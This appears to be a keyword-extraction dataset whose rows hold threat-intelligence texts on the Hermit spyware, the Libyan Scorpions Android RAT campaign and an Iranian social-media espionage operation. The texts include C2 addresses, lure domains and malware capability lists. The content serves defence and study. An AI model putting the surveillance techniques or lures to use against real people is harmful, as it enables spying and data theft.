collection capabilities, and the fact that we carry them all the time, mobile devices are the perfect target for surveillance. While not all of us will be targeted by sophisticated spyware, here are some tips to keep yourself and your organization safe:8/17Update your phone and apps: operating systems and apps will often have vulnerabilities that need to be patched. Update them to ensure the exploits are resolved. Don’t click on unknown links: one of the most common ways for an attacker to deliver malware is by sending you a message pretending to be a legitimate source. Don’t click on links, especially when you don’t know the source. Don’t install unknown apps: exercise caution when installing unknown apps, even if the source of the app seems like a legitimate authority. Periodically review your apps: sometimes malware can change settings or install additional content to your phone. Check your phone periodically to ensure nothing unknown has been added.In addition to following the security best practices outlined above, we strongly recommend having a dedicated mobile security solution to ensure that your device is not compromised by malware or phishing attacks.To the best of our knowledge the apps described in this article were never distributed through Google Play. Users of Lookout security apps are protected from these threats. Indicators of Compromise Core App indicatorsSHA1 Port 2.229.68[.]182 8442 2.228.150[.]86 8443 93.57.84[.]78 8443 93.39.197[.]234 8443 45.148.30[.]122 58442 85.159.27[.]61 8442Sample of domains used in Hermit’s targeting operations119-tim[.]info 133-tre[.]info 146-fastweb[.]info 155-wind[.]info 159-windtre[.]info iliad[.]info amex-co[.]info cloud-apple[.]info fb-techsupport[.]commilf[.]house kena-mobile[.]info poste-it[.]info rojavanetwork[.]info store-apple[.]info wind-h3g[.]infoParameter configurations Hermit usesParameter vps p1,p3,p4,p5,p6 Certificate fingerprint, IP address, and port, for C2 communication Server endpoints for various C2 communications This is the benign URL opened when the application is launched Determines if the icon of the application will be hidden. String used along with android_id as a unique device identifier Expected signature of the app. If the signature does not match the app will not run. Package name of another app interacted with on device Component name of a service contained in wdpn app HTTP header added to every request for authentication Pre-shared key used for message authentication Boolean indicating whether APK files should be deleted if anti- emulation checks fail Fingerprint for protobuf encryption setup Public key for protobuf encryption setup9/17applicationId, gcmSenderId projectId, storageBucket apiKeyModules downloaded by HermitFirebase Messaging Service setup parametersModule ClipboardDevice InfoFunctionNoteTrack foreground app. Steal stored account emails. Steal browser bookmarks / searches. Steal calendar events, attendees. Take pictures. Steal current and future clipboard content. Exfiltrate device information, including:Applications root/exploitation statusDownload and install APK files on the File Upload Upload files from the device. LogEnable/disable verbose logging. Exfiltrate notification content. Dismiss/snooze notifications that reference, but don’t originate from, the Hermit app. Take pictures of the screen.Notification Telegram Prompt the user to reinstall Telegram onthe device with a downloaded APK.WhatsApp Prompt the user to reinstall WhatsAppvia Play Store.Use root to silently install apps. Use root to copy files the app doesn’t have access to.Use root to run ‘screencap’ Use root to silently uninstall/reinstall Telegram. Also copy the old app’s data to the new app’s folder, changing the files’ SELinux contexts and ownersLookout Threat Lab researchers have uncovered enterprise-grade Android surveillanceware used by the government of Kazakhstan within its borders. While we’ve been following this threat for a while using Lookout Endpoint Detection and Response (EDR) these latest samples were detected in April 2022, four months after nation-wide protests against government policies were violently suppressed.Based on our analysis, the spyware, which we named “Hermit,” is likely developed by Italian spyware vendor RCS Lab S.p.A and Tykelab Srl, a telecommunications solutions company we suspect to be operating as a front company.This isn't the first time Hermit has been deployed. We know that the Italian authorities used it in an anti-corruption operation in 2019. We also found evidence suggesting that an unknown actor used it in northeastern Syria, a predominantly Kurdish region that has been the setting of numerous regional conflicts.While some Hermit samples have been detected before and are broadly recognized as generic spyware, the connections we make in this blog to developers, campaigns and operators are new.RCS Lab, a known developer that has been active for over three decades, operates in the same market as Pegasus developer NSO Group Technologies and Gamma Group, which created FinFisher. Collectively branded as “lawful intercept” companies, they claim to only sell to customers with legitimate use for surveillanceware, such as intelligence and law enforcement agencies. In reality, such tools have often been abused under the guise of national security to spy on business executives, human rights activists, journalists, academics and government officials. What is Hermit?Named after a distinct server path used by the attacker’s command and control (C2), Hermit is a modular surveillanceware that hides its malicious capabilities in packages downloaded after it’s deployed.We obtained and analyzed 16 of the 25 known modules, each with unique capabilities. These modules, along with the permissions the core apps have, enable Hermit to exploit a rooted device, record audio and make and redirect phone calls, as well as collect data such as call logs, contacts, photos, device location and SMS messages.10/17We theorize that the spyware is distributed via SMS messages pretending to come from a legitimate source. The malware samples analyzed impersonated the applications of telecommunications companies or smartphone manufacturers. Hermit tricks users by serving up the legitimate webpages of the brands it impersonates as it kickstarts malicious activities in the background.We’re aware of an iOS version of Hermit but were unable to obtain a sample for analysis. Kazakhstan deploymentOur analysis suggests that Hermit has not only been deployed to Kazakhstan, but that an entity of the national government is likely behind the campaign. To our knowledge, this marks the first time that a current customer of RCS Lab’s mobile malware has been identified.We first detected samples from this campaign in April 2022. They were titled “oppo.service” and impersonated Chinese electronic manufacturer Oppo. The website the malware used to mask its malicious activity is an official Oppo support page (url in the Kazakh language that has since gone offline. We also found samples that impersonate Samsung and Vivo.The now defunct Kazkhak language Oppo support page is loaded and displayed to users as malicious activities happen in the background.The samples used in the Kazakh targeted campaign connected to the C2 address at 45.148.30[.]122:58442. However, further analysis of the spyware’s C2 server revealed that this IP address is used as a proxy for the real C2 server at 85.159.27[.]61:8442. The real C2 IP address is administered by STS Telecom, a small internet service provider (ISP) operating out of Nur-Sultan, Kazakhstan’s capital. Based on sparse online records, STS specializes in “other wired telecommunications” and cable services.11/17Our interaction with a poorly configured C2 server revealed the true C2 IP address.Syria, Italy and other targetsPrior to detecting the Kazakhstan samples, we found a reference to “Rojava,” a Kurdish-speaking region in northeastern Syria, in the passive DNS records of Hermit. This is significant because the region has been the site of ongoing crises, such as the Syrian civil war and conflicts between the Islamic State (IS) and U.S.-led coalition support of the Kurdish-led Syrian Democratic Forces (SDF). Most recently, Turkey conducted a series of military operations against the SDF that resulted in partial occupation of the region.The domain we found (rojavanetwork[.]info) specifically imitates “Rojava Network,” a social media brand on Facebook and Twitter that provides news coverage and political analysis of the region, often in support of SDF operations.The domain rojavanetwork[.]info seems to be specifically imitating “Rojava Network,” a social media brand on Facebook and Twitter tha analysis of the region, often in support of SDF operations.Outside Syria, Hermit has been deployed in Italy. According to a document released by the Italian lower house in 2021, Italian authorities potentially misused it in an anti-corruption operation. The document mentioned an iOS version of Hermit and linked RCS Lab and Tykelab to the malware, which corroborates our analysis. RCS Lab and its controversial connections12/17Like many spyware vendors, not much is known about RCS Lab and its clientele. But based on the information we do have, it has a considerable international presence.According to leaked documents published in WikiLeaks in 2015, RCS Lab was a reseller for another Italian spyware vendor HackingTeam, now known as Memento Labs, as early as 2012. Correspondences between the two companies revealed that RCS Lab engaged with military and intelligence agencies in Pakistan, Chile, Mongolia, Bangladesh, Vietnam, Myanmar and Turkmenistan — the latter three ranked as authoritarian regimes by the Democracy Index.RCS Lab also has past dealings with Syria, another authoritarian regime, as part of its collaboration with Berlin-based Advanced German Technology (AGT) to sell surveillance solutions.Countries that had ties to RCS Lab’s past business connections. Top row: Chile, Pakistan, Mongolia and Bangladesh; bottom row: MyaTykelab and its connection to RCS LabAccording to its own website, Tykelab provides innocuous technology solutions. However, we found various publicly- available clues that suggest otherwise. In addition to the Italian parliamentary document, we found several pieces of evidence tying Tykelab to RCS Lab.For example, a current Tykelab employee’s LinkedIn profile indicates that they also work at RCS Lab. In addition, the company offers services that require skills that may be useful in the development and delivery of surveillanceware, such as knowledge or interaction with telecommunications networks, social media analysis, SMS services and mobile app development. One of the Tykelab job postings for a security engineer we found spells out desired skills that would have direct application to surveillance of mobile networks and devices.This Tykelab job listing highlights interest in mobile network vulnerabilities, penetration testing, and reverse engineering: skills that canIn our own analysis of Hermit, we were able to tie Tykelab to Hermit and RCS Lab. One of the IP addresses Hermit used for C2 communications revealed an SSL certificate shared with another IP, 93.51.226[.]53. Notably, the shared certificate has Milan, Italy in the locality field which is where RCS Lab is headquartered.This second IP used another SSL certificate that directly named RCS as the organization and Tykelab as the organization unit. The location references Rome, which is the headquarters location of Tykelab13/17An SSL certificate tied to Hermit infrastructure shows that Tykelab and RCS Lab are both connected to the spyware.Technical analysis: Hermit’s advanced capabilitiesHermit is a highly configurable surveillanceware with enterprise-grade capabilities to collect and transmit data.For example, it uses 20-plus parameters, which enables any operator to tailor it to their campaign. The spyware also attempts to maintain data integrity of collected ‘evidence’ by sending a hash-based message authentication code (HMAC). This allows the actors to authenticate who sent the data as well as ensure the data is unchanged. Using this method for data transmission may enable the admissibility of collected evidence.To cover up its true intentions, Hermit is built to be modular. This means malicious functionality is hidden inside additional payloads that the malware downloads as needed.How it tricks victims and avoids detectionAs we mentioned earlier, Hermit pretends to come from legitimate entities, namely telecommunications companies or smartphone manufacturers. To keep up this facade, the malware loads and displays the website from the impersonated company simultaneously as malicious activities kickstart in the background.The first malicious step is to decrypt an embedded configuration file with properties that are used to communicate with the C2 server. But before communication happens, Hermit performs a series of checks to ensure that it isn’t being analyzed. This includes looking for the presence of an emulator and signs that the app itself has been modified to make analysis easier.Modules and data collectionOnce the malware connects with the C2, it takes instructions on what modules to download, each with distinct capabilities. In addition to the modules, the permissions that the malware requests indicate the various ways it could collect data.Hermit can be asked by the C2 to download modules from any URL and then load them dynamically.In total we acquired 16 modules by interacting with the IP address (45.148.30[.]122:58442) “oppo.service” used for C2 communications. Based on identification numbers assigned to the modules in Hermit’s code, there are at least 25 modules.14/17Within the core app, we found an abstract class called “module” that provided additional hints as to what the rest of the modules are capable of. The code contained references to exploit usage, which was further confirmed by clues found in obtained modules. While we weren’t served exploits during testing, we can tell that an exploited device will modules that can use exploits.If the device is confirmed to be exploitable then it will communicate with the C2 to acquire the files necessary to exploit the device and start its root service. This service will then be used to enable elevated device privileges such as access to accessibility services, notification content, package use state and the ability to ignore battery optimization.Beyond the root service, some of the modules expect or attempt to use root access directly through a su binary. These modules will attempt to modify the shared preferences of the SuperSU app in order to enable the execution of root commands without user interaction.While this may be a generic attempt at using root without user awareness, SuperSU may also be a part of the unknown exploitation process. If root is not available, the modules may prompt the user to take actions which will accomplish the same goals.These are the modules we were able to acquire (refer to the appendix for a complete breakdown of each modules):Accessibility Event Screen CaptureAddress Book TelegramLike other weaponry, spyware can easily be abusedVendors of so-called “lawful intercept” spyware, such as RCS Lab, the NSO Group and Gamma Group, usually claim to only sell to entities that have a legitimate use for surveillanceware such as police forces fighting organized crime or terrorism. However, there have been many reports, especially in recent years, of spyware being misused.We found evidence of Hermit being deployed in Kazakhstan and Syria, countries with poor human rights records. Even in the case of the anti-corruption operations in Italy, there was alleged mishandling of personal and private data.In a sense, electronic surveillance tools are not that different from any other type of weaponry. Just this month, faced with financial pressure, CEO of the NSO group Shalev Hulio opened up the possibility of selling to “risky” clients. Spyware makers operate in secrecy and with limited oversight and the legitimacy of the use of their products is rarely as clear-cut as they project.How to protect yourself from spyware like HermitWith sophisticated data collection capabilities, and the fact that we carry them all the time, mobile devices are the perfect target for surveillance. While not all of us will be targeted by sophisticated spyware, here are some tips to keep yourself and your organization safe:15/17Update your phone and apps: operating systems and apps will often have vulnerabilities that need to be patched. Update them to ensure the exploits are resolved. Don’t click on unknown links: one of the most common ways for an attacker to deliver malware is by sending you a message pretending to be a legitimate source. Don’t click on links, especially when you don’t know the source. Don’t install unknown apps: exercise caution when installing unknown apps, even if the source of the app seems like a legitimate authority. Periodically review your apps: sometimes malware can change settings or install additional content to your phone. Check your phone periodically to ensure nothing unknown has been added.In addition to following the security best practices outlined above, we strongly recommend having a dedicated mobile security solution to ensure that your device is not compromised by malware or phishing attacks.To the best of our knowledge the apps described in this article were never distributed through Google Play. Users of Lookout security apps are protected from these threats. Indicators of Compromise Core App indicatorsSHA1 Port 2.229.68[.]182 8442 2.228.150[.]86 8443 93.57.84[.]78 8443 93.39.197[.]234 8443 45.148.30[.]122 58442 85.159.27[.]61 8442Sample of domains used in Hermit’s targeting operations119-tim[.]info 133-tre[.]info 146-fastweb[.]info 155-wind[.]info 159-windtre[.]info iliad[.]info amex-co[.]info cloud-apple[.]info fb-techsupport[.]commilf[.]house kena-mobile[.]info poste-it[.]info rojavanetwork[.]info store-apple[.]info wind-h3g[.]infoParameter configurations Hermit usesParameter vps p1,p3,p4,p5,p6 Certificate fingerprint, IP address, and port, for C2 communication Server endpoints for various C2 communications This is the benign URL opened when the application is launched Determines if the icon of the application will be hidden. String used along with android_id as a unique device identifier Expected signature of the app. If the signature does not match the app will not run. Package name of another app interacted with on device Component name of a service contained in wdpn app HTTP header added to every request for authentication Pre-shared key used for message authentication Boolean indicating whether APK files should be deleted if anti- emulation checks fail Fingerprint for protobuf encryption setup Public key for protobuf encryption setup16/17applicationId, gcmSenderId projectId, storageBucket apiKeyModules downloaded by HermitFirebase Messaging Service setup parametersModule ClipboardDevice InfoFunctionNoteTrack foreground app. Steal stored account emails. Steal browser bookmarks / searches. Steal calendar events, attendees. Take pictures. Steal current and future clipboard content. Exfiltrate device information, including:Applications root/exploitation statusDownload and install APK files on the File Upload Upload files from the device. LogEnable/disable verbose logging. Exfiltrate notification content. Dismiss/snooze notifications that reference, but don’t originate from, the Hermit app. Take pictures of the screen.Notification Telegram Prompt the user to reinstall Telegram onthe device with a downloaded APK.WhatsApp Prompt the user to reinstall WhatsAppvia Play Store.Use root to silently install apps. Use root to copy files the app doesn’t have access to.Use root to run ‘screencap’ Use root to silently uninstall/reinstall Telegram. Also copy the old app’s data to the new app’s folder, changing the files’ SELinux contexts and owners17/17 ","{'phrases': ['Hermit', 'SMS messages', 'users', 'ISP', 'checks', 'detection', 'analysis', 'contacts', 'modules', 'surveillance', 'ties', 'exploits', 'the device', 'root access', 'data', 'notifications', 'the C2', 'addition'], 'target': 'Hermit; SMS messages; users; ISP; checks; detection; analysis; contacts; modules; surveillance; ties; exploits; the device; root access; data; notifications; the C2; addition.'}"
Attackers; Android malware; Telegram; IP address; Spain; the malware; contacts; WhatsApp; the malware; a malicious app; a downloader; communications; the downloader; a downloader; a keylogger; the keylogger; the keylogger; data; the compromised device; additional malware; malware; the attackers.,"["" 1. In August 2016, CSIRT received reports of Android malware spreading in Libya via Telegram. 2. The malware was first discovered after a high-profile Telegram account was compromised from an IP address in Spain. 3. The attackers used the compromised account to spread malware disguised as a voice message to the account's contacts. 4. The malware was injected into a legitimate Android app called URLShortener. 5. The malware communicates with a C2 server at winmeif.myq-see.com and exfiltrates extensive data from devices. 6. CSIRT believes the malware has ties to known Android RATs like JSocket and AlienSpy. 7. CSIRT sinkholed the malware and analyzed the attacker infrastructure dating back to September 2015. 8. The campaign uses Windows and Android malware with evidence of non-sophisticated, likely Arabic speaking threat actors in Libya. ""]","Extract the keywords: Cyberkov Co. Ltd. www.cyberkov.com info@cyberkov.comHunting Libyan ScorpionsInvestigating a Libyan Cyber EspionageCampaign Targeting High-ProfileInfluentialsTLP: WhiteFor public distribution18/September/2016Tel: +965 22445500 | Fax: +1 (888) 4333113 | Email: info@cyberkov.com | Website: www.cyberkov.com1Hunting Libyan ScorpionsLegal Notice:This document is intended for public use and distribution. Unauthorized use or reproduction of this document without referencing Cyberkov is prohibited.This document has been prepared by Cyberkov Co. Ltd.Document ControlDocument Title Last Modification Date Distribution ReferenceHunting Libyan Scorpions 01/September/2016 18/September/2016 Public Distribution PD-001Cyberkov Contact DetailsName General queryCyberkov Media Office media@cyberkov.com +965 22445500 +1 (888) 433-3113 +965 22445500 info@cyberkov.comTrademarkCyberkov and the Cyberkov logo “ ” are trademarks of Cyberkov Co. Ltd. All other trademarks mentioned in this document are owned by the mentioned legacy body or organization. The general service conditions of Cyberkov Co. Ltd. apply to this documentation, unless it is explicitly specified otherwise.Tel: +965 22445500 | Fax: +1 (888) 4333113 | Email: info@cyberkov.com | Website: www.cyberkov.com12Hunting Libyan ScorpionsTable of ContentsDocument Control 1Cyberkov Contact Details 1Executive Summary 3Tactics, Techniques and Procedures (TTPs) 4Malware Analysis 6Command and Control Communication 21Sinkhole 21Real C2 24Threat Actor and Attribution 25Threat Actors Infrastructure 29To Be Continued… 33Mitigating Libyan Scorpions Attacks on Android 33Indicators of Compromise (IOCs) 33Tel: +965 22445500 | Fax: +1 (888) 4333113 | Email: info@cyberkov.com | Website: www.cyberkov.com23Hunting Libyan ScorpionsExecutive SummaryLibya maybe known in non-stable political system, civil war and militant groups fighting for the land and oil control but it is definitely not known in cyber malicious activities, cyber espionage and hacking groups. No parties in Libya before this analysis reported to use cyber attacks, malwares nor recruit hackers to spy on their rivals. Today we have a different story.In the past weeks on 6 August 2016, Cyberkov Security Incident Response Team (CSIRT) received a numerous Android malwares operating in different areas in Libya especially in Tripoli and Benghazi.The malware spreads very fast using Telegram messenger application in smartphones, targeting high-profile Libyan influential and political figures.The malware first discovery was after a highly Libyan influential Telegram account compromised via web Telegram using IP address from Spain.The following day, the attackers spread an Android malware binded with legitimate Android application from the compromised Telegram account to all his contacts pretending it is an important voice message (misspelled it by “Voice Massege.apk”) which indicates a non-english (maybe an Arabic) attacker.After spreading the malware, more Android smartphones has been infected using the same technique (via Telegram) and then repost the malware again and again making a network of victims.Analysis of this incident led us to believe that this operation and the group behind it which we call Libyan Scorpions is a malware operation in use since September 2015 and operated by a politically motivated group whose main objective is intelligence gathering, spying on influentials and political figures and operate an espionage campaign within Libya.Also, the analysis of the incident led to the discovery of multiple malwares targeting Android and Windows machines.Libyan Scorpions threat actors used a set of methods to hide and operate their malwares. They appear not to have highly technical skills but a good social engineering and phishing tricks. The threat actors are not particularly sophisticated, but it is well-understood that such attacks don’t need to be sophisticated in order to be effective.Using malwares as weapon in an active warzone such as Libya, make the victims easy targets for assassination or kidnapping by tracking their physical locations and monitoring them day and night.Tel: +965 22445500 | Fax: +1 (888) 4333113 | Email: info@cyberkov.com | Website: www.cyberkov.com34Hunting Libyan ScorpionsTactics, Techniques and Procedures (TTPs)Libyan Scorpions is believed to be a political motivated group targeting a high-level influential and political figures in multiple cities within Libya. Libyan Scorpions first compromised a personal Telegram account for a Libyan influential person with unknown vector. The victim received a push notification from his Telegram app that someone from Spain is logged into his account:The victim mistakenly deleted Telegram application from his phone thinking that this is going to stop the attacker(s).Second day, the attacker used the victim phone number to spear phish his contacts in Telegram by pretending that the real person is sending a voice message while the file is actually a malicious APK (Android Package) file.This APK file targets only Android-based smartphones. Once the new victim click on the APK file, the application installs itself in the device without any problem and is fully functional. The icon of the application appears in the Apps menu named (URL Shortener).Tel: +965 22445500 | Fax: +1 (888) 4333113 | Email: info@cyberkov.com | Website: www.cyberkov.com45Hunting Libyan ScorpionsThe real malicious code is running in the background as Android service1.1 url +965 22445500 | Fax: +1 (888) 4333113 | Email: info@cyberkov.com | Website: www.cyberkov.com56Hunting Libyan ScorpionsMalware AnalysisCyberkov Security Incident Response Team (CSIRT) started analyzing the APK file (malware) and the first step was to unpack it.After unpacking with apktool and reading (AndroidManifest.xml) file, it appears that the application is a malware injected inside a legitimate application having java package name: de.keineantwort.android.urlshortener.Tel: +965 22445500 | Fax: +1 (888) 4333113 | Email: info@cyberkov.com | Website: www.cyberkov.com67Hunting Libyan ScorpionsSearching for the application in Google Play store with that specific package name (url yields:Tel: +965 22445500 | Fax: +1 (888) 4333113 | Email: info@cyberkov.com | Website: www.cyberkov.com78Hunting Libyan ScorpionsThe application exists in the store and the Libyan Scorpions hacking group took an instance of the APK and injected their malware into that legitimate application to spread it.The real application is created by keineantwort.de and we have verified it from their main website:Going back to (AndroidManifest.xml) file, the malware register itself as receiver of almost all intents and request almost all permissions available in Android system!Tel: +965 22445500 | Fax: +1 (888) 4333113 | Email: info@cyberkov.com | Website: www.cyberkov.com89Hunting Libyan ScorpionsTel: +965 22445500 | Fax: +1 (888) 4333113 | Email: info@cyberkov.com | Website: www.cyberkov.com910Hunting Libyan ScorpionsThe malware can access location, network state, battery status, Bluetooth, camera, capturing audio, internet, …, etc.After launching the malicious application for the first time, it checks if the Android device is rooted or not and if rooted, it asks for root permission.Tel: +965 22445500 | Fax: +1 (888) 4333113 | Email: info@cyberkov.com | Website: www.cyberkov.com1011Hunting Libyan ScorpionsCarrying on the reverse engineering of the malware, we found a file called “config.json” which is a base64 encoded json file containing the configuration of the malware and its Command and Control (C2). The characteristics of the malware (“a.txt” and “config.json” files) and the functionality of it is very similar to and Technology Backbone.Tel: +965 22445500 | Fax: +1 (888) 4333113 | Email: info@cyberkov.com | Website: www.cyberkov.com1112Hunting Libyan ScorpionsGoing back to the domain/hostname used by the Libyan Scorpions hacking group, it appears that myq- see.com is a dynamic DNS service open for the public.Tel: +965 22445500 | Fax: +1 (888) 4333113 | Email: info@cyberkov.com | Website: www.cyberkov.com1213Hunting Libyan ScorpionsScrolling down the web page, it is created by Q-See which is a company that sells cameras and it seems that Q-See published this service to help their customers to connect to their IP cameras regardless of IP changes.Tel: +965 22445500 | Fax: +1 (888) 4333113 | Email: info@cyberkov.com | Website: www.cyberkov.com1314Hunting Libyan ScorpionsThe malware uses RootTools and RootShell components to make root privileged tasks easy in Android.Tel: +965 22445500 | Fax: +1 (888) 4333113 | Email: info@cyberkov.com | Website: www.cyberkov.com1415Hunting Libyan ScorpionsThe picture below showing that the malware is capable of taking pictures from the camera of the compromised device and upload it to the C2.The malware begins by implementing a Trust Manager that accepts all certificates so that Libyan Scorpions hackers are sure no victim left disconnected due to SSL certificates issues.Tel: +965 22445500 | Fax: +1 (888) 4333113 | Email: info@cyberkov.com | Website: www.cyberkov.com1516Hunting Libyan ScorpionsThe malware is able to turn the Android phone into a remote listening bug by opening the Microphone and recording the audio then send it to the C2.The malware is able to browse the files and folders stored inside the Android device.Tel: +965 22445500 | Fax: +1 (888) 4333113 | Email: info@cyberkov.com | Website: www.cyberkov.com1617Hunting Libyan ScorpionsThe malware is able to monitor the physical location of the compromised Android device.The malware is able to get the call logs along with phone numbers, duration and date and time of each call.Tel: +965 22445500 | Fax: +1 (888) 4333113 | Email: info@cyberkov.com | Website: www.cyberkov.com1718Hunting Libyan ScorpionsThe malware is able to read the SMS messages and the list of contacts saved in the device.Besides, the malware is able to get the phone number, country and network operator name from cellular towers of the telecom company of the target.Tel: +965 22445500 | Fax: +1 (888) 4333113 | Email: info@cyberkov.com | Website: www.cyberkov.com1819Hunting Libyan ScorpionsThe malware uses Allatori Java Obfuscator to protect the code and make it harder to reverse engineer and it obviously uses communication protocol based on Java JSON objects encapsulated in SSL connection wrapper. Again, this behavior and characteristics of the malware is very similar to JSocket and AlienSpy Android RATs.After finalizing the analysis of the Android malware, Cyberkov uploaded it to VirusTotal to see if it has been uploaded before and what information we can get from it:Tel: +965 22445500 | Fax: +1 (888) 4333113 | Email: info@cyberkov.com | Website: www.cyberkov.com1920Hunting Libyan ScorpionsCyberkov discovered that the malware has not been uploaded to VirusTotal before and the first sample of this malware has been uploaded by us. However, 8 out of 54 AntiVirus engines detect it which is a very low detection rate (15%). Most and major American top Gartner Antivirus companies did not detect it!!Tel: +965 22445500 | Fax: +1 (888) 4333113 | Email: info@cyberkov.com | Website: www.cyberkov.com2021Hunting Libyan ScorpionsCommand and Control CommunicationCyberkov tried to discover the attacker behind this malicious application by sinkholing the malware and analyzing the real C2.Sinkhole Cyberkov created a fake server simulating the real C2 of the Libyan Scorpions hacking group and sinkholed the malware to study the behavior of the malware deeply.Upon connection to the C2, the malware sends a lot of information about the target including: Country, Malware Path, Local IP Address, RAM, Android Version, Device Name, …, etc.Tel: +965 22445500 | Fax: +1 (888) 4333113 | Email: info@cyberkov.com | Website: www.cyberkov.com2122Hunting Libyan ScorpionsThe fake C2 server is able to send fake commands to the malware and read the reply as well.Those commands (103, 104 and 105) correspond to the following list of commands defined in the malware:Tel: +965 22445500 | Fax: +1 (888) 4333113 | Email: info@cyberkov.com | Website: www.cyberkov.com2223Hunting Libyan ScorpionsEach number corresponds to one command to be done by the malware. For example, the command (111) uninstalls the real application “URLShortener”:Will result in:Tel: +965 22445500 | Fax: +1 (888) 4333113 | Email: info@cyberkov.com | Website: www.cyberkov.com2324Hunting Libyan ScorpionsReal C2 By connecting to the real C2 IP address, Cyberkov found that the malware is really of JSocket/AlienSpy family of RATs since that family of RATs open the port 1234 with a self-signed certificate of “assylias”2.According to Shodan, the port (1234) has been spotted open since 12-07-2016 which is 25 days before the first discovery.2 url at_FINAL.pdfTel: +965 22445500 | Fax: +1 (888) 4333113 | Email: info@cyberkov.com | Website: www.cyberkov.com2425Hunting Libyan ScorpionsThreat Actor and AttributionSeems like the Libyan Scorpions threat actors are running multiple Android RATs since numerous ports protected by SSL layer are open in (winmeif.myq-see.com) machine.Also, the Libyan Scorpions threat actors left phpinfo.php script on the webserver running on port 80 with useful information that could expose them. Their machine is running Windows 7 Professional Service Pack 1.Tel: +965 22445500 | Fax: +1 (888) 4333113 | Email: info@cyberkov.com | Website: www.cyberkov.com2526Hunting Libyan ScorpionsUsername of the Windows machine is admin.The computer name of Windows machine is ADMIN.Tel: +965 22445500 | Fax: +1 (888) 4333113 | Email: info@cyberkov.com | Website: www.cyberkov.com2627Hunting Libyan ScorpionsThe Libyan Scorpions threat actors use a Dell laptop and have Skype installed and are setting behind a NAT infrastructure that maybe used to launch wider attacks using multiple RATs on multiple platforms.By using Threat Intelligence Platforms and Feeds such as PassiveTotal, Cyberkov was able to discover more 9/9/2015 until the time of writing this report using 5 different hostnames and multiple malicious malwares.The following table summarizes the list of hostnames used by the attacker(s):Hostname Samsung.ddns.me Wininit.myq-see.com Winmeif.myq-see.com Collge.myq-see.com Sara2011.no-ip.bizFirst Seen 26-04-2016 24-05-2016 07-08-2016 09-09-2015 08-10-2015Last Seen 08-09-2016 22-08-2016 22-08-2016 22-08-2016 08-10-2015Tel: +965 22445500 | Fax: +1 (888) 4333113 | Email: info@cyberkov.com | Website: www.cyberkov.com2930Hunting Libyan ScorpionsAll of the hostnames point to the same C2 IP address used by the attackers (but sara2011.no-ip.biz):Also, using PassiveTotal, the C2 is connected to 2 more malwares used by the attackers having the following of 21 out of 56 (37.5%) and has been uploaded first time to VirusTotal on 23-04-2016.Notice that this malware targets Windows machines and not Android smartphones. It is compiled on 15-04- targeting android smartphones.Also, the name of activities and services contains net.droidjack.server name which makes us sure it is DroidJack malware.Tel: +965 22445500 | Fax: +1 (888) 4333113 | Email: info@cyberkov.com | Website: www.cyberkov.com3233Hunting Libyan ScorpionsTo Be Continued…Cyberkov will continue investigating Libyan Scorpions hacking group operating in Libya and will update this report with a follow-up reports regarding any future cyber activities.Mitigating Libyan Scorpions Attacks on AndroidCyberkov recommends the following points in order to protect the victims from such malwares:Install DrWeb Security Space for Android (A leading Russian AntiVirus Company) Update your Android operating system regularly   Use of DrWeb Telegram Bot (DrWebBot) to scan links and files shared on Telegram chats or groups   Never install applications from unknown sources  Use Telegram with Secret Chat feature only  Always verify with your partners when sending and receiving filesInstall Zemana Mobile AntiVirus (A leading Turkish AntiMalware and AntiFraud Company)Indicators of Compromise (IOCs) The following table summarizes the list of indicators to detect the malware:Type Voice Massege.apk winmeif.myq-see.com Wininit.myq-see.com Samsung.ddns.me Collge.myq-see.com Sara2011.no-ip.bizTel: +965 22445500 | Fax: +1 (888) 4333113 | Email: info@cyberkov.com | Website: www.cyberkov.com33 ","{'phrases': ['August 2016', 'CSIRT', 'reports', 'Android malware', 'reading', 'Libya', 'Telegram', 'the malware', 'first', 'file', 'Compromise', 'IP address', 'Spain', 'the attackers', 'Use', 'a voice message', 'contacts', 'URLShortener', 'C2', 'winmeif.myq-see.com', 'ties', 'RATs', 'JSocket', 'AlienSpy', 'September 2015', 'Windows', 'Arabic'], 'target': 'August 2016; CSIRT; reports; Android malware; reading; Libya; Telegram; the malware; first; file; Compromise; IP address; Spain; the attackers; Use; a voice message; contacts; URLShortener; C2; winmeif.myq-see.com; ties; RATs; JSocket; AlienSpy; September 2015; Windows; Arabic.'}"
access; targets; social media; links; credential harvesting; connections; malware; exfiltration.,"['1. The hackers created fake personas on social media platforms like Facebook, Twitter, and LinkedIn. 2. They used the fake profiles to connect with targets including US government and military officials. 3. After making connections, the hackers sent spearphishing emails to targets. 4. The phishing emails aimed to get users to click malicious links and enter credentials into fake pages. 5. Some phishing emails also delivered custom malware capable of exfiltrating data. 6. The malware and stolen credentials provided access to sensitive accounts and data. 7. The social engineering focused campaign operated undetected since 2011. 8. Technical indicators suggest the activity stems from Iranian threat actors. ']","Extract the keywords: 2016/7/7Iranian Hackers Targeted US Ofﬁcials in Elaborate Social Media Attack Operation | SecurityWeek.ComSECURITYWEEK NETWORK:Information Security News Infosec Island Suits and SpooksSecurity Experts:WRITE FOR USSubscribe (Free) CISO Forum 2016 ICS Cyber Security Conference Contact UsMalware & ThreatsVulnerabilities Fraud & Identity Theft Tracking & Law Enforcement Risk & ComplianceRisk Management WhitepapersSecurity ArchitectureCloud Security Application SecurityManagement & Strategyurlﬁcials-elaborate-social-media-attack-operation1/92016/7/7Iranian Hackers Targeted US Ofﬁcials in Elaborate Social Media Attack Operation | SecurityWeek.ComRisk Management Incident ResponseSCADA / ICSHome › CyberwarfareIranian Hackers Targeted US Officials in Elaborate Social Media Attack OperationBy Mike Lennon on May 29, 2014Share801TweetRecommend41Iranian threat actors, using more than a dozen fake personas on popular social networking sites, have been running a wide‐spanning cyber espionage operation since 2011, according to cyber intelligence firm iSIGHT Partners.The recently uncovered activity, which iSIGHT Partners calls NEWSCASTER, was a “brazen, complex multi‐year cyber‐espionage that used a low‐tech approach to avoid traditional security defenses –exploiting social media and people who are often the ‘weakest link’ in the security chain.”Using the fake personas, including at least two (falsified) legitimate identities from leading news organizations, and young, attractive women, the attackers were supported by a fictitious news organization called NewsOnAir.org (Do Not Visit) and were successful in connecting or victimizing over 2,000 individuals.“These credible personas then connected, linked, followed, and “friended” target victims, giving them access to information on location, activities, and relationships from updates and other common content,” iSIGHT Partners said.urlﬁcials-elaborate-social-media-attack-operation2/92016/7/7Iranian Hackers Targeted US Ofﬁcials in Elaborate Social Media Attack Operation | SecurityWeek.ComPodcast: Inside the 'NEWSCASTER' Cyber Espionage CampaignThe attackers used popular social media platforms such as Facebook, Twitter, LinkedIn, Google+, YouTube and Blogger as their attack platform.While the attack method is not novel, the cyber 